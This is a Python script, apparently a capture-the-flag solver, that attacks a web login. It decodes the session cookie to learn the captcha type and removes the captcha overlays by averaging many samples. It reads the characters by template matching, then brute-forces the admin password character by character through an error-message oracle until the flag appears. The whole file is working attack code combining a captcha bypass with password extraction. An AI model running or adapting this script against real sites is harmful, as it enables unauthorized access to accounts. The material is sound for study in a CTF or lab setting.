import requests
import urllib.parse
import base64
import json
import io
import numpy as np
from PIL import Image
import cv2.cv2 as cv
import os
import zlib

flag = input()

service = input()

cheat_overlays = False


captcha_count = 20
alphabet = "ABCDEFGHIJKLMNPQRSTUVWXYZ2345689"

captchas = {i: [] for i in range(captcha_count)}


def get_captcha(session=requests):
    r = session.get(urllib.parse.urljoin(service, "captcha.png"))
    cookies = session.cookies if session != requests else r.cookies
    if cookies["session"][0] == ".":
        compressed = True
        cookies["session"] = cookies["session"][1:]
    else:
        compressed = False
    base64_cookie = cookies["session"].split(".")[0]
    missing_padding = len(base64_cookie) % 4
    if missing_padding:
        base64_cookie += "=" * (4 - missing_padding)
    raw_data_cookie = base64.b64decode(base64_cookie)
    if compressed:
        cookie = json.loads(zlib.decompress(raw_data_cookie))
    else:
        cookie = json.loads(raw_data_cookie)
    return (
        cv.cvtColor(np.array(Image.open(io.BytesIO(r.content))), cv.COLOR_BGR2GRAY),
        cookie["captcha_type"],
        cookie.get("solution", "nosol"),
    )


if cheat_overlays:
    os.chdir("container")
    from container.server import captcha_overlays as overlays2

    overlays = []
    for overlay in overlays2:
        img = Image.new("RGBA", (200, 50), (255, 255, 255, 255))
        img.alpha_composite(overlay)
        overlays.append(cv.cvtColor(np.array(img), cv.COLOR_BGR2GRAY))

    os.chdir("..")
else:
    print("gathering captcha images...")

    while min([len(c) for c in captchas.values()]) < 20:
        captcha = get_captcha()
        captchas[captcha[1]].append(captcha[0])

    print("extracting captcha overlays...")

    overlays = []

    for i in range(captcha_count):
        overlays.append(np.max(captchas[i], axis=0))


def remove_overlay(captcha):
    overlay = overlays[captcha[1]]
    overlay = cv.bitwise_not(overlay)
    captcha = np.max([captcha[0], overlay], axis=0)
    captcha = cv.threshold(captcha, 1, 255, cv.THRESH_BINARY)[1]
    return captcha


trained_key = {}
training_dir = os.listdir("training")

for char in alphabet:
    if "%s.png" % char in training_dir:
        trained_key[char] = [
            cv.cvtColor(cv.imread("training/%s.png" % char), cv.COLOR_BGR2GRAY)
        ]
    else:
        trained_key[char] = [cv.bitwise_not(np.zeros((50, 40), dtype=np.uint8))]


def solve_captcha(captcha):
    captcha_no_overlay = remove_overlay(captcha)
    string = ""
    for i in range(5):
        char_img = captcha_no_overlay[:, i * 40 : (i + 1) * 40]
        string += min(
            trained_key.items(),
            key=lambda c: np.sum(c[1][0]) - np.sum(np.min([c[1][0], char_img], axis=0)),
        )[
            0
        ]  # the magic that matches characters. basically it compares each captcha character with the one from the training set and picks the one with a smallest difference
    return string


if __name__ == "__main__":
    assert get_captcha()[2] == "nosol"
    assert not cheat_overlays

    session = requests.session()
    session.get(urllib.parse.urljoin(service, "captcha.png"))  # init session cookie

    request_count = 1

    def login(passwd, captcha, session):
        global request_count
        r = session.post(
            urllib.parse.urljoin(service, "login"),
            data={"username": "admin", "password": passwd, "captcha": captcha},
        )
        request_count += 1
        if flag in r.text:
            print("request count:", request_count)
            print("found flag!")
            exit()
        elif "zero tolerance policy" in r.text:
            print("failed a captcha!")
            cv.waitKey(0)
            exit(1)
        return "unknown error" in r.text

    admin_alphabet = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

    current_pass = ""
    while True:
        for char in admin_alphabet:

            if login(current_pass + char, solve_captcha(get_captcha(session)), session):
                current_pass += char
                print("%s" % current_pass)
                break
        else:
            exit(1)

